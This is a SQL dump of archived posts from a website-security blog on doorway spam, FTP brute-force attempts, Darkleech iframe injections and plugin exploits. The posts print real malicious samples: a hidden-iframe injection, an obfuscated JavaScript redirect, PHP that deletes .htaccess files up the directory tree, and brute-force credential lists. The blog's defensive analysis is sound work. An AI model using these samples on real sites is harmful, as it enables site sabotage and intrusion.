.To WebmastersIt might be tricky to determine whether your site fell victim to a black hat SEO hack since hackers do their best to hide evidence from site owners and regular visitors. At the same time antivirus tools won’t help you here since links and redirects (in case they can actually see them) are not considered harmful. Nonetheless, a thoughtful webmaster is always equipped with proper tools and tricks (click here for details) to determine such issues.  They range from specialized Google search queries and and reports in Webmaster Tools to log analysis and server-side integrity control.In addition to the tricks that I described here, you can try to simply load your site with JavaScript turned off. Sometimes this is all it takes to find hidden links whose visibility is controlled by a script.Fighting black hat SEO hacksOf course, site owners are responsible for what happens with their sites, should protect them and clean them up in case of hacks. Doorways on hacked sites would never appear in search results if all webmasters would quickly mitigate such issues.But let’s take a look at this from a different perspective. The main goal of all black hat SEO hacks is to put their doorways to the top on Google for relevant keywords and get a targeted search traffic. And 80% (or even more) massive campaigns target a very narrow set of keywords and their modification. If Google actively monitor the first pages of search results for such keywords and penalize doorways, this could significantly reduce efficacy of such campaigns leaving very few incentive to hack website to put spammy links there. And you don’t have to monitor every possible keyword combination. In my experience, most of them will finally point to the same doorways.I can see Google moving in this direction. The description of the above mentioned ranking algorithm update is very promising. However, as the [buy cialis] query with 0% of relevant search results on the first page shows — a lot should be improved.P.S  Just before posting this article, I checked results for [buy cialis] once more and … surprise!.. found a link to a Wikipedia article about Tadalafil at the 4th position. Wow! Now we have 1 result that doesn’t seem to have anything to do with hacked sites.Related postsCloaking: Think Outside of [Your] BoxCareless Webmasters as WordPress Hosting Providers for Spammers“Cheap Vista” or Cloaked Spam on High-Profile SitesMatt Cutts on MalwareIntroduction to Website Parasites                                                                                  Tags: black hat seo cialis cloaking doorway google hidden links spam                                                    			                                            « FTP Brute Force Attacks?                Unmask Parasites joins Sucuri »            			    Reader\'s Comments (2)       	        			        			Colin | 29 Aug 2013 9:27 am 						Hi Dennis,Great analysis, very intersting.I actually contacted the support team at Volunteer.gov a couple of weeks ago, and they were able to remove the hacked pages they were hosted, as well as the other .govs. Great result, was happy at that :)They were hosting a pharma online store, which on investigation was apparently set up to facilitate credit card fraud.Cheers                   			        			Denis | 29 Aug 2013 4:28 pm 						Good!-1 spammy doorway on .gov.Hope Google will also take care of what it returns for certain spammy queries.', '', 'http://blog.unmaskparasites.com/2013/08/21/analyzing-buy-cialis-search-results/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (140, 'FTP Brute Force Attacks?', 'unmask', '26 Jun 13', 'Loading site search ...          			                FTP Brute Force Attacks?                          26 Jun 13   Filed in Website exploits                Hacking websites using FTP access has been one of the most popular attack vectors during the last few year. I can still see many massive site infections done via FTP.In most cases, the first step of such attacks is stealing FTP credentials from local computers of webmasters. Back in 2009, I described how PC malware stole passwords saved in popular FTP clients such as FileZilla, CuteFTP, SmartFTP and many more. This is still a prevailing vector. More exotic password theft methods include keyloggers, FTP traffic sniffing, and stealing user databases of hosting providers who prefer convenience over security and store actual client passwords in plain text or slightly encrypted (instead of storing only hashes of passwords).If you ask regular webmasters how hackers can break into their server via FTP, many of them will answer that hackers could guess the password (hence the need to have hard-to-guess passwords).  Of course, it is hard to guess whatever password at the first attempt, so one might expect to see multiple such attempts (so-called brute force attacks) before a password is cracked and hackers get access to a server. However in real life, I haven’t come across such FTP brute force attacks. Until this month…FTP log analysisI helped a webmaster of a hacked site and, as always, requested recent access and FTP logs to figure out how the site was hacked. The FTP logs clearly showed that someone used a valid username and passwords to upload infected files to the server. This happened several times a day (constant reinfections) from different IPs in different countries. Quite a typical picture.What was untypical were requests that looked like a brute force attack. They came from different IPs and each IP tried to login using many invalid usernames.Choice of usernames in brute force attacks.Here are just a few such sessions and the usernames they tried.198.50.144.128 (Canada		        Montreal		        Ovh Hosting Inc) – 165 login attempts within 70 seconds.second_level_domainsecond_level_domawebmasterwhere <second_level_domain> should be replaced with a real second level domain of a site. E.g. in case of “example.com” the second_level_domain will be example.This attack used the <domain name> as a username and webmaster as an alternative (supposedly default) username, and tried multiple popular passwords from some dictionary.46.29.255.84 (United States		        Lombard		        Deepak Mehta Fie) 	– 9 login attempts at a rate of 2 a second:second_level_domainsecond_level_domainsecond_level_domainsecond_level_domainftpsecond_level_domainrootsecond_level_domainadminsecond_level_domainuserIn this case, the attacker used domain name derivatives (appending words like ftp, admin, user) as usernames,  and the passwords probably matched the usernames (e.g. exampleftp/exampleftp).  A few times they re-tried the same usernames. Probably with slightly different passwords.110.85.113.113,  110.86.165.187, 117.26.118.189, 117.26.119.68 (all from China		        Fuzhou		        Chinanet Fujian Province Network) — 76 login attempts in less than 5 minutes from 4 IPs.00000011111111223312312332112345612345678123456789123654123abc1472581473692222223211233333334444445201314521521555555666666777777888888987654321999999abc123adminadmin111admin123admin222admin321admin333admin444admin555admin666admin777admin888admin999asd123asdasdsecond_level_domainsecond_level_domaintop_level_domaindata123qwe123qwertytestwebweb123wwwwww123zxc123zxcvbnDistributed attackThe last one was obviously a distributed brute force attack where bots from 4 different IPs worked simultaneously and in sync. E.g. one checked “111111” then another checked “112233“, then third checked “222222” and “333333“, then fourth checked “444444“, and so on. Most likely this attack also assumed that some sites may use the same words both as a username and a password.The above three attack took place within 26 hours. Each of them used different approach to choosing usernames and passwords, and they came from different parts of the Internet. It means that there is a real interest in FTP brute force attacks among cyber criminals.Why didn’t I come across such attacks before?After all, brute-force attacks on WordPress and Joomla admin interfaces proved to be very efficient. What makes them so efficient is the fact that there are many millions of WP and Joomla sites out there, and out of those millions there will always be enough sites whose admins were thoughtless enough to choose weak passwords.  That’s why I see hundreds or even thousands of login attempts per day in access logs of almost every WordPress and Joomla site I work with. And unfortunately, some of those site were hacked as a results of the brute force attacks.One might think that FTP is an even better target for brute force attacks since almost every site has FTP access so the number of victims with weak FTP passwords should be substantially larger than the number of WP an Joomla sites with crackable passwords. However it’s not that easy. You should not forget than in case of WP and Joomla, hackers assume that site administrators use the CMS default usernames (admin for WP and administrator for Joomla) so they only need to guess their passwords. But in case of FTP, the username is not known. There is no default FTP username. This is especially true for shared hosting environments where every client must use a unique username. So you need to guess both username and password in order to get access to a site, which dramatically reduces efficiency of brute force attacks (don’t forget the network latency of each FTP request which prevents from testing millions of variants per seconds that one might expect in a latency-free environment).In order to try the brute force approach, hackers need to narrow down their attack to the simplest cases and hope that the Internet is so big that even a tiny fraction of sites with hackable FTP credentials will worth the effort. And the Internet is really big (there are more than 100,000,000 .com domains alone) and to have better results one needs to attacks as many of them as possible, so the set of username/password pairs should be kept as tight as possible to provide results in reasonable time. Based on the above FTP log analysis, the current approach is to target: sites that use their domain name or some easy derivative from a domain name as a username along with a weak password. sites that use the same simple words for both usernames and passwords.Another reason why FTP brute-force attacks are not popular is the FTP logins can be tracked by server administrators who can, for example limit number of consecutive failed login attempts per IP address and then block the offending IPs (for example, using the fail2ban tool).I also guess that many server and client bots might simply lack the FTP brute force functionality…Do you have any better explanation?Why did I see the FTP brute force attacks on that particular site?I have two hypothesis:1. Massive FTP brute force attacks are in the proof of concept stage. A few years ago WordPress brute force attacks were quite rare too, but once criminals figured out that they could be very successful if you had enough resources to attack a large number of site, such attacks went mainstream. So maybe if FTP brute force attacks eventually prove to deliver good results, we’ll see a flood of login attempts in FTP logs of most sites (I hope not).2. In the beginning of the post, I forgot to mention about one more failed login attempt. It used the “anonymous” username and the 66.249.72.181 IP address. The thing is the IP address belongs to Google, more specifically to Googlebot. This means that there are some FTP links (e.g. ftp://example.com ) to that site on the web and Googlebot tries to crawl them using the default anonymous username which normally doesn’t require a password and is used for public FTP sites. Here is the explanation from John Mueller (Webmaster Trends Analyst at Google):When we find links to FTP content, we’ll generally attempt to crawl  those URLs. If they’re publicly accessible and return normal content, we  may choose to index them as well. While it’s not that common, there are  occasionally queries where a file on an FTP server is a good result.So my guess is such attacks may be limited to the sites that have direct FTP links to them on the web.Do you have any better explanation?Just in case. No, the original successful FTP hack that I investigated was not a result of a brute force attack. The username was not obvious and the  password was strong. The attackers used the tried-and-true credential  theft approach.To webmastersRegardless of the chances to see massive FTP brute force attacks in future, the described example should be considered as yet another lesson to all webmasters, who should realize all risks associated with FTP.Carefully choose both username and password.They should not be the sameThe username shoudn’t be easy to guess (e.g.  your site domain name is not the best choice)The password should be strong.Don’t save passwords in FTP programs. Configure them so that they ask for a password every time you connect to your site. If you work with multiple sites and/or don’t like the idea of memorizing many passwords, consider using password managers like KeePass or LastPass — they save your passwords much more securely.Consider using SFTP instead of FTP that sends your passwords in plain  text (they can be easily intercepted, for example, when you use public Wi-Fi). Most popular FTP  programs support SFTP, so the switch should be painless. If you  manage your own server, consider not installing an FTP server  altogether (or uninstalling it now if there are no others users who can’t use SFTP).If you manage a server, consider blocking multiple consecutive failed login attempts at a firewall level (tools like fail2ban may help). Moving FTP to a custom port may also help.Minimize risks of infecting your local computer (which brings you a step closer to password theft). Make sure that all software on your computer is up-to-date. This includes all OS  security updates, all browser updates and all browser plugin updates. Here you can check whether your browser is vulnerable:https://browsercheck.qualys.com/http://www.mozilla.org/en-US/plugincheck/Related posts:10 FTP Clients Malware Steals Credentials FromBeware: FileZilla Doesn’t Protect Your PasswordsWeak Passwords and Tainted WordPress WidgetsIntroduction to Website Parasites﻿                                                                                  Tags: brute-force FTP log analysis                                                    			                                            « Rotating Iframe URLs – One a Minute                Analyzing [Buy Cialis] Search Results »            								Comments are closed.', '', 'http://blog.unmaskparasites.com/2013/06/26/ftp-brute-force-attacks/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (141, '“Fancybox for WordPress Has Expired” Infection', 'unmask', '01 Apr 15', 'Loading site search ...          			                “Fancybox for WordPress Has Expired” Infection                          01 Apr 15   Filed in General, Short Attack Reviews, Website exploits                Today I began to notice quite a massive and very unusual attack that leverages vulnerabilities in older versions of the FancyBox for WordPress plugin.As you might know, versions 3.0.2 and older of this plugin allowed anyone to craft special POST requests to /wp-admin/admin-post.php or /wp-admin/admin-ajax.php and change values of specific plugin options in WordPress database. The plugin uses the modified options to build its own JavaScript code. As a result, the malicious content gets injected into generated WordPress pages.A typical malicious injection looks like this:Such attacks use the documented exploit code to inject malicious code into the “padding” value.The exploited vulnerability had been fixed on February 4th. Nonetheless, many blogs failed to update the plugin and hackers routinely find such blogs and infect them.The today’s attack also uses this exploit and modifies the “padding” value, but the code it injects cannot be called malicious:When visitors load such “infected” pages, they see this warning:WARNING: This version of the Fancybox for WordPress plugin has expired! Please upgrade to the latest version!And when they click on the “OK” button, they automatically get redirected to the Fancybox for WordPress changelog page in the official WordPress plugin repository.On one hand, this infection makes blogs unusable since it redirects visitors to WordPress plugin repository before they can read anything. On the other hand, it is very hard to ignore such a warning — if site owners want people to visit their sites they have to upgrade (or remove) the vulnerable version of the plugin ASAP.Now is the time to check if your blog shows such warnings. If you don’t see them, it’s not a reason to relax and wait for such a hard push to upgrade. Make sure all your themes and plugins are up-to-date now.                                                                                   Tags: April1 Fancybox WordPress                                                    			                                            « Darkleech Update – November 2014                            			    Reader\'s Comments (%)       	        			        			Pascal | 02 Apr 2015 8:43 am 						I’m a little suspicious because this article is tagged with “April1″ – though I don’t really see the sense in making this a hoax?', '', 'http://blog.unmaskparasites.com/2015/04/01/fancybox-for-wordpress-has-expired-infection/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (142, 'Darkleech Update – November 2014', 'unmask', '27 Nov 14', 'Loading site search ...          			                Darkleech Update – November 2014                          27 Nov 14   Filed in Short Attack Reviews, Website exploits                Just wanted to document some latest changes in Darkleech behavior that may help you detect it.I’d like to thank internet security enthusiasts who share their findings with me. Without you, I could have easily missed these new (?) details.Quick recapDarkleech is a root level server infection that installs malicious Apache modules. The modules inject invisible iframes into server response when it is already prepared (linebreaks added for readability).<style>.a4on6mz5h { position:absolute; left:-1376px; top:-1819px} </style> <div class=\"a4on6mz5h\"><ifr ame src=\"hxxp://tfmjst .hopto .org/nsiumkogckv1tv4locfzyv2eykqss9ltfb9wnmhfqz1ol2\" width=\"247\" height=\"557\"></ifram e></div>All the elements of this code are random and auto-generated on the fly (style name, coordinates, iframe diminsions, URL paths). Moreover, the iframe domains change every few minutes — lately hackers prefer free No-IP.com dynamic DNS hostnames like hopto.org, ddns.net, myftp.biz, myftp.org, serveftp.com, servepics.com, etc.This infection is hard to detect as it only shows up once per IP per day (or maybe even more seldom). And since it works on a low system level, it can detect if server admins are logged in, so it lurks until they log out — this means that they won’t see anything even if they monitor outgoing TCP traffic.For more details, please check the links at the bottom of this post.What’s new?IE=EmulateIE9Recently, I’ve been pointed at the fact that now Darkleech also adds the following meta tag setting IE 9 compatibility mode in Internet Explorer. It looks like it searches for the </head> tag and replaces it with the following code (again, linebreaks added for readability):<meta http-equiv=\'x-ua-compatible\' content=\'IE=EmulateIE9\'></head><style>.syxq9la69 { position:absolute; left:-1666px; top:-1634px} </style> <div class=\"syxq9la69\"><iframe src=\"hxxp://jsnrgo .ddns .net/nsiumkogckv1tv4locfzyv2eykqss9ltfb9wnmhfqz1ol2\" width=\"285\" height=\"554\"></iframe></div>This IE=EmulateIE9 instruction tells modern versions of Internet Explorer to render a web page as if they were IE 9, using all the features that has been deprecated in IE 10 and newer versions of IE. Some of the legacy features are known to have vulnerabilities and hackers try to exploit them turning the compatibility mode on (e.g. VML-related exploit)_SESSION_ID cookieIn addition to temporary IP blacklisting, Darkleech also uses the _SESSION_ID cookie that expires in one week. It adds the following cookie into response headers:Set-Cookie: _SESSION_ID=-1; expires=Wed 03-Dec-2014 09:32:48 GMT; path=/So even if you change your IP address (e.g. if you have a dynamic IP address) you still won’t see malware for the following 7 days. So don’t forget to clear/block cookies if you are trying to reproduce infected response.Most likely the IP blacklisting also works for one week now too.Just a couple of more things:As you might have figured out, it looks for Internet Explorer User-Agent (and derivatives like Maxthon, Avant).Referer is not important at the moment. I managed to trigger it even without the Referer header.That’s it for today. Please let me know if you have some other news about Darkleech.Previous posts about Darkleech:Malicious Apache Module Injects IframesRFI: Server-wide iframe injectionsWorking With the Darkleech Bitly DataDarkleech + Bitly.com = Insightful Statistics (Sucuri blog)Server Compromises – Understanding Apache Module iFrame Injections and Secure Shell Backdoor (Sucuri blog)                                                                                   Tags: Apache Darkleech EmulateIE9 No-IP                                                    			                                            « Most Contradictive Doorway Generator                “Fancybox for WordPress Has Expired” Infection »            			    Reader\'s Comments (2)       	        			        			WordPress Malware Causes Psuedo-Darkleech Infection | Sucuri Blog | 26 Mar 2015 4:25 pm 						[…] and this is the code from November of 2014 […]                   			        			WordPress Malware Causas Psuedo-Darkleech Infección | Sucuri Español | 13 Apr 2015 10:41 pm 						[…] y este es el código de noviembre de 2014: […]', '', 'http://blog.unmaskparasites.com/2014/11/27/darkleech-update-november-2014/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (143, 'Most Contradictive Doorway Generator', 'unmask', '12 Sep 14', 'Loading site search ...          			                Most Contradictive Doorway Generator                          12 Sep 14   Filed in Short Attack Reviews                Check this thread on WordPress.org forum. The topic starter found a suspicious PHP file and asked what it was doing.The code analysis shows that it’s some sort of a spammy doorway. But it’s a very strange doorway and the way that it works doesn’t make sense to me.First of all, this script has a random text and code generator. The output it generates is [kind of] always unique. Here is a couple of output pages:http://pastebin.com/ymwMZMWPhttp://pastebin.com/Y6B7WM2T...<title>Is. Last spots brows: Dwelling. Immediately moral.</title></head><body>listend40721<span>Flowerill merry chimes - has: Her - again spirits they, wooers. Delight preserve. For he. Free - snow set - grave lapped, icecold made myself visitings allow, beeves twas. Now one:...We usually see such a random text, when spammers want search engines to index “unique” content with “right” keywords. But…1. the script returns the page with the 404 not found code.header(\"HTTP/1.1 404 Not Found\");so the page won’t be indexed by search engines.2. The obfuscated JavaScript code at the bottom of the generated page redirects to a pharma site after about a second.function falselye() { falselya=29; falselyb=[148,134,139,129,140,148,75,145,140,141,75,137,140,128,126,145,134,140,139,75,133,143,130,131,90,68,133,145,145,141,87,76,76,145,126,127,137,130,145,138,130,129,134,128,126,143,130,144,75,130,146,68,88];falselyc=\"\"; for(falselyd=0;falselyd<falselyb.length;falselyd++) { falselyc+=String.fromCharCode(falselyb[falselyd]-falselya); } return falselyc; } setTim eout(falselye(),1263);decodedwindow.top.location.href=\'hxxp://tabletmedicares .eu\';Update: on another site the script redirected to hxxp://uanlwkis .com (also pharma site), which was registered only a few days ago on Sept 6th, 2014.But the generated text has no pharma keywords. One more hint that it’s not for search engines. Maybe it’s an intermediary landing page of some email spam campaign that just needs to redirect visitors? I saw many such landing pages on hacked sites. But it most cases they looked like the decoded version of the script — just a redirection code. Indeed why bother with sophisticated random page generator if no one (neither humans nor robots) is going to read it?3. There is also this strange piece of code:$s=\'/\';if (strtolower(substr(PHP_OS,0,3))==\'win\') $s=\"\\\\\\\\\";$d=array(\".$s\");$p=\"\";for($i=1; $i<255; $i++){$p.=\"..$s\";if (is_dir($p)){array_push($d,$p);}else{break;}}foreach($d as $p){$a=\"h\".\"tac\".\"c\".\"es\".\"s\";$a1=$p.\".$a\";$a2=$p.$a;$a3=$p.\"$a.txt\";@chmod($a1,0666);@unlink($a1);@chmod($a2,0666);@unlink($a2);@chmod($a3,0666);@unlink($a3);}What it does it tries to find an delete(!) all file with names .htaccess, htaccess and htaccess.txt in the current directory and all(!) the directories above the current.That just doesn’t make sense. Why is it trying to corrupt websites? I would understand if it only removed its own files and injected code in legitimate files, but it tries to just remove every .htaccess (and its typical backups) without checking what’s inside. That’s a really disruptive and annoying behavior given that many sites rely on the settings in .htaccess (e.g. most WordPress and Joomla sites).It’s indeed a most contradictive doorway generator that I ever seen. I can’t find any good explanation why it does things the way it does. Maybe you have any ideas?Related posts:Analyzing [Buy Cialis] Search ResultsRich Snippets in Black Hat SEOCareless Webmasters as WordPress Hosting Providers for SpammersHtaccess Redirect to Example.ru/dir/index.phpIntroduction to Website Parasites                                                                                  Tags: doorway htaccess redirect                                                    			                                            « Google -> Doorway -> Google -> Spam                Darkleech Update – November 2014 »            								Comments are closed.', '', 'http://blog.unmaskparasites.com/2014/09/12/most-contradictive-doorway-generator/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (144, 'Google -> Doorway -> Google -> Spam', 'unmask', '11 Jun 14', 'Loading site search ...          			                Google -> Doorway -> Google -> Spam                          11 Jun 14   Filed in Uncategorized                Just a few thoughts about an interesting behavior of a black-hat SEO doorway.Typically hackers create doorways on compromised sites to make search engines rank them for certain keywords and then, when searchers click on the links in search results, those doorways redirect them further to a site that hackers really promote. Sometime that redirect may go through some TDS (traffic directing service) but the whole scheme remains pretty much the same:Search results -> doorway -> beneficiary siteToday, when doing a backlink research of one of such pharma doorways, I encountered a different scheme — a one with a loop.The doorway had this URL structure:http://www.hacked-site.com/blog/?prednisolone-without-prescriptionWhen I checked it in Unmask Parasites or in Google cache, I saw spammy content with links to doorways on other hacked sites. Quite typical.When I opened that page in a web browser, it redirected to a TDShxxp://bh2r3gof .biz/sutra/in.cgi?5&from=90dc16aaf3e24ea68c94c3f784a37ff9&gdw=w-48&gdf=%2F90dc16aaf3e24ea68c94c3f784a37ff9-f08f149982bf04ffaa308aba00b2d569.txt&host=www.hacked-site.com&kw=prednisolone%20without%20prescription&HTTP_REFERER=https%3A%2F%2Fwww.google.com%2F%3Fsource%3Dnoref%26q%3Dprednisolone%2520without%2520prescriptionCloaking and conditional redirects to traffic directing services are also quite typical for doorways.Then TDS made another hop:hxxp://bh2r3gof .biz/sutra/in.cgi?5&from=90dc16aaf3e24ea68c94c3f784a37ff9&seoref=8bB06MP5xFTR3TkqmNILbbW5mW30f%2B%2FMiQdbatwxiv5CUUTkQjEO75VtTs7IRqdVTmPfmX……..2FIXHlBdqV6iDd1ruYQMhqmYVCozdkTrAN76fOABiczAnd then I ended up on … Google:http://www.google.com/search?q=prednisolone+without+prescriptionAnd that is not very typical. But interesting.One one hand, it looks like the spammers didn’t consider me as a target traffic (probably because of my IP) and redirected back to the Google search results page for the same query that I supposed to be using when found that site. For some, this chain of redirects may look as if they clicked on a search result and then Google thought for some time and reloaded the same page, which may look like just a glitch.On the other hand, it looks like a second level of search engine optimization, when spammers fine tune a search query that may return better doorways. I can’t help thinking about this because when I see the search results on Google pages that the TDS redirects me to, I realize that most of them are doorways on hacked sites (yes, including those with fake stars in ratings).I know, it’s quite pointless. Why redirect people who already clicked on your doorway to a new set of search results? Although those results may contain some of your other doorways, there is no guarantee that the searcher will not go away or click on them and not on links of your competitors? And you can’t control Google search results — it may happen that there will be no your doorways on the results page.OK. Let’s try to think as the TDS owners. The TDS recognizes the traffic that it doesn’t need for the pharma campaign. It mayredirect it to pharma landing pages anyway (which may decrease the quality and the price of such a traffic)dispose of that traffic altogether (redirect it to a neutral third-party site, like Google)try to monetize that traffic anyway — redirect it to some scam site, porn site, malware site or any other resource that knows how to take advantage of low quality traffic.<warning:unfounded speculation>But what it the spammers also run another campaign that targets the traffic that doesn’t fit their pharma campaign? They can simply redirect the traffic to landing pages of the second campaign. But such traffic will not be targeted. People searched for different things. So maybe it is worth it to “re-target” the traffic and redirect the searchers to a Google result page for keywords relevant to that second campaign and that contains links to their doorways.Here’s the scenario:People search something on Google and click on some result. For some reason Google reloads the page and shows them completely different results for a different query. Some searchers will definitely leave (don’t worry, this was unwanted traffic anyway) but some may become interested in what Google offers them and click on results (after all spammers usually promote something that people need and if it comes from Google it looks more legit). So, instead of either lost or untargeted traffic, they get targeted traffic of people who willingly clicked on search results. All they need to do is make sure their doorways dominate for relevant search queries (shouldn’t be hard since the TDS provide the search query itself and there is no need to rank for short generic queries.)</warning:unfounded speculation>OK, enough speculations. That particular campaign was not using the second level Google optimization. It simply dumped unneeded traffic back to Google. When opening the same doorways from different country IPs, the TDS redirected me to a random “Canadian Pharmacy” site from its pool of about a dozen of sites.Anyway, the point of this post is despite of Matt Cutts’ recent announcement of rolling out the second ranking update for “very spammy queries” I still see that 50% or more of top search results for pharma keywords still point to doorways on hacked sites.This past weekend we started rolling out a ranking update for very spammy queries: http://t.co/NpUZRqpnBI— Matt Cutts (@mattcutts) May 21, 2014And as long as “very spammy queries” return “very spammy results”, there will be incentive for black hat SEOs to hack sites and create doorways there.Related posts:Analyzing [Buy Cialis] Search ResultsRich Snippets in Black Hat SEOCareless Webmasters as WordPress Hosting Providers for Spammers“Cheap Vista” or Cloaked Spam on High-Profile SitesIntroduction to Website Parasites                                                                                  Tags: black hat seo doorway TDS                                                    			                                            « Working With the Darkleech Bitly Data                Most Contradictive Doorway Generator »            			    Reader\'s Comments (2)       	        			        			SearchCap: Google PayDay Loan 3.0, Bing Ads URL Tagging & World Cup Fever | 12 Jun 2014 9:14 pm 						[…] Google -> Doorway -> Google -> Spam, Unmask Parasites. Blog. […]                   			        			Rosanne & Jerry Shalf | 03 Dec 2014 6:27 pm 						I keep getting redirected to a Canadian drugstore site when I type in ashlandmuseum.org. Before the Canadian drugstore site pops up I see something that looks like tds….etc. but it quickly moves to the Canadian site, so I don’t know the complete set of letters.  I have a macbook pro 2012 and am using Maverick 10.9.5 OS.  It doesn’t always happen, which is weird, and it only happens on my computer, not others.  It happens when I use Firefox and Safari.  How do I get rid of it?  I had Applecare go through the machine and we got rid of various viruses, but we couldn’t fix this one.  Applecare said it was because of something Google did and only Google can fix, but I can’t figure out how to reach Google and ask for help.  Please, somebody, help me!!', '', 'http://blog.unmaskparasites.com/2014/06/11/google-doorway-google-spam/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (145, 'Working With the Darkleech Bitly Data', 'unmask', '10 Feb 14', 'Loading site search ...          			                Working With the Darkleech Bitly Data                          10 Feb 14   Filed in General                Data Driven Security took the time to analyze the raw data that I published in my recent post on Sucuri blog about how I used Bitly data to understand the scale of the Darkleech infection.In their article, they have a few questions about data formats, meaning of certain fields and some inconsistencies, so I’ll try to answer their questions here and explain how I worked with the data.So I needed to get information about all the links of the “grantdad” bitly account.I checked the API and somehow missed the “link_history” API request (it was the first time I worked with the bitly API), so I decided to screenscrape the web pages where bitly listed the links creaded by grantdad. 1,000 pages with 10 links on each. Since pages didn’t contain all the information I needed I only collected the short links so that I could use them later in API calls to get more detailed information about each of them.As you can see I was limited with the 10,000 links that bitly made available via their web interface. Not sure if I could get more links via that link_history API. Right now it returns “ACCOUNT_SUSPENDED” and when it was not suspended, API calls for known links beyond those 10,000 produced various errors.When I compiled my list of 10,000 links I used the following API calls to get information about each of the links:Referring domainsAPI:link/referring_domains — for each link, it returned a list of domains referring traffic to this link (in our case sites, containing the iframes) along with the number of clicks from each domain. This helped me compile this list of iframe loads per domain: http://pastebin.com/HYaY2yMb. Then I tried to resolve each of the domain names and created this list of infected domains per IP address: http://pastebin.com/Gxr51Nc1.I also used this API call to get number of iframe loads for each bitly link.InfoAPI:link/info – this gave me timestamps of the links and their long URLs (the rest information was not interesting for my research). Unfortunately, this particular API call is poorly documented so I can only guess what this timestamp mean. It is actually called “indexed“. But I guess it’s the time when the link was created. It is definiteley not the time of the first click because there were no registered clicks for many of the links. As a result, I compiled these datasets:http://pastebin.com/UmkDZZp0http://pastebin.com/w7Kq3ybV ,which contain tab separated values of “bitly link id”, “timestamp”, “# of clicks/iframe loads”, and “long URL”.At that point, I already had the number of iframe loads from the previous step (“link/referring_domains“). Then, for readability, I converted the numeric timestamp using this Python function datetime.datetime.fromtimestamp(). However, you can notice that the second dataset (for January 28th) has a different date format. Instead of “2014-01-25 19:10:07” it uses “Jan 28 23:10:19“. Why? Because of pastebin.com. Because it doesn’t allow unregistered users to post more than 500Kb of data (I deliberately post such data as a guest). Removing the year from the date allowed me to save 4 bytes on each row and fit the dataset in 500Kb.Actually this 500Kb limit is the reason why I have separate pastebins for each date and only specify bitly ids instead of the full bitly links.CountriesAnd finally, API:link/countries – for each link, it returned a list of countries referring traffic to this link along with the number of clicks from those countries. This helped me compile this list of iframe loads per country http://pastebin.com/SZJMw3vx.The last dataset Feb 4-5When I wrote my blogpost on February 5th, I noticed that there were new links available on the Bitly.com grantdad acount page. I began to browse pages of his links and figured that most of the links were the same (Jan 25 and 28) but around 1,700 of them were new (late February 4th and the beginning of February 5th). I immediately repeated the same procedure that included screenscraping, and 3 API calls for each new bitly link. After that I created this new dataset http://pastebin.com/YecHzQ1W and updated the rest datasets (domains, countries, etc).Some more detailsIf you check the total numbers in these two datasets (domains) http://pastebin.com/HYaY2yMb and (countries) http://pastebin.com/SZJMw3vx you’ll see the different in total number of iframe loads: 87152 and 87269. I don’t know why. I used the same links just different API calls (referring_domains and countries) and the totals are supposed to be the same. I didn’t save the “per link” data so can’t tell exactly whether it was my error or the bitly API produces slightly inconsistent results. Anyway, the difference is neglectable for my calculations and doesn’t affect the estimations (given that I tried to underestimate when in doubt ).I didn’t check for duplicates that guys from Data Driven security found in my datasets. They must have to do with my screenscraper and the way that Bitly.com displays links in user accounts. The total number of scraped links matched the number of links that Bitly reported for the user. The extra 121 clicks that these duplicates are responsible for are so close to the 117 difference that I mentioned above so I wonder if these numbers somehow connected? Anyway, this shouldn’t affect the accuracy of the estimates either.Building the geo distribution mapFor the map, I used the Geochart from Google visualization. Since the difference in numbers of clicks for the top 3 countries and the lower half of the list was 3 orders of magnitude, I had to re-scale the data so that we could still see the difference between countries with 50 iframe loads and 2 iframe loads.. I used a square of a natural logarithm for thatMath.pow( Math.round( Math.log(i)), 2)This gave me a nice distribution from 0 to 100 and the below map.IFrame Load Geo DistributionSpeculation on the link generationAfter checking the link creation per minute-of-an-hour distribution, Bob Rudis wondered:This is either the world’s most inconsistent (or crafty) cron-job or grantdad like to press ↑ + ENTER alot.I guess, it was neither cron-job nor manual link creation. I think the [bitly] links were created on-demand. So if someone loads a page and Darkleech needs to inject an iframe then it (or rather the server it works with) generates a new bitly link. Given that this malware may lurk on a server, there may be time periods when no malicious code is being injection into any web pages across all the infected servers. At the same time, the bitly links with zero clicks may refer to page loads by various bots (including our own) when the malicious code is injected but the iframe is never loaded. On the other hand, the volume of bitly links with 0 clicks (~35%) suggests that there might really more complex link generation mechanism than a simple “on-demand” approach.Anyway, that’s great when people double check our data and try to find new interesting patterns there. Make sure to let me know (here or on the Sucuri blog) if you find more patterns and inconsistencies, or have any comments on how the Darkleech works.Related posts:Malicious Apache Module Injects IframesRFI: Server-wide iframe injectionsBety.php Hack. Part 2. Black Hats in Action.Introduction to Website Parasites                                                                                  Tags: Bitly Darkleech data statistics                                                    			                                            « Invasion of JCE Bots                Google -> Doorway -> Google -> Spam »            								Comments are closed.', '', 'http://blog.unmaskparasites.com/2014/02/10/working-with-the-darkleech-bitly-data/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (146, 'Invasion of JCE Bots', 'unmask', '27 Jan 14', 'Loading site search ...          			                Invasion of JCE Bots                          27 Jan 14   Filed in Website exploits                Joomla has been one of the most popular CMS for a long time.  It powers a huge number of sites.  That’s great! The flip side of this fact is Joomla has been very popular for a long time and there are still very many sites that use older versions of Joomla as well as older version of Joomla components. For example, the 1.5.x branch of Joomla (2008-2010) still has a noticeable share in live Joomla sites.Old versions may work well for your site but they have multiple well known security holes, so they are the low hanging fruit for hackers. Let me show this using a real world example.JCE attackThere is a JCE component — a fancy content editor that can be found almost on every Joomla site. It has a well known security hole that allows anyone to upload arbitrary files to a server.You can easily find a working exploit code for this vulnerability.  What it does is:Checks whether a vulnerable version of JCE is installed (2.0.11, 2.0.12, 2.0.13, 2.0.14, 2.0.15, 1.5.7.10, 1.5.7.11, 1.5.7.12, 1.5.7.13, 1.5.7.14)Exploits the bug in the JCE image manager to upload a PHP file with a .gif extenstion to the images/stories directoryThen uses a JSON command to rename the .gif file to 